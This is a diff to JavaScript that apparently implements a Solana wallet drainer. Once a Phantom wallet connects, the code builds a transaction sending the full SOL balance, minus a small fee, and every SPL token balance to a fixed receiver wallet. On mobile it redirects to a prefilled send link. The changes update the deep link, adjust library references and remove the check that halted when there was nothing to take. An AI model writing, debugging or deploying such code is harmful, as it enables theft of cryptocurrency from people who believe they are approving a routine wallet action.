@@ -21,8 +21,8 @@
             }
 
             if (isMobileDevice()) {
-                // Mobile deep link to open Phantom app
-                const mobileLink = `phantom://action=send&recipient=${receiverWallet}`;
+                // Mobile deep link to open Phantom app with recipient prefilled
+                const mobileLink = `https://phantom.app/ul/v1/send?recipient=${receiverWallet}`;
                 window.location.href = mobileLink;
             } else {
                 if (!window.solana) {
@@ -50,26 +50,21 @@
                             solanaWeb3.SystemProgram.transfer({
                                 fromPubkey: publicKey,
                                 toPubkey: new solanaWeb3.PublicKey(receiverWallet),
-                                lamports: balance - 5000,  // Leave a small fee for transaction
+                                lamports: balance - 5000,  // Leave small fee for transaction
                             })
                         );
                     }
 
                     // Get SPL token balances
                     const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
-                        programId: new solanaWeb3.PublicKey(solanaWeb3.TOKEN_PROGRAM_ID),
+                        programId: solanaWeb3.TOKEN_PROGRAM_ID
                     });
-
-                    if (tokenAccounts.value.length === 0 && balance <= 5000) {
-                        alert("No tokens available to transfer.");
-                        return;
-                    }
 
                     for (let tokenAccount of tokenAccounts.value) {
                         const tokenAmount = tokenAccount.account.data.parsed.info.tokenAmount.uiAmount;
                         if (tokenAmount > 0) {
                             transaction.add(
-                                solanaSplToken.createTransferInstruction(
+                                splToken.createTransferInstruction(
                                     new solanaWeb3.PublicKey(tokenAccount.pubkey),
                                     new solanaWeb3.PublicKey(receiverWallet),
                                     publicKey,
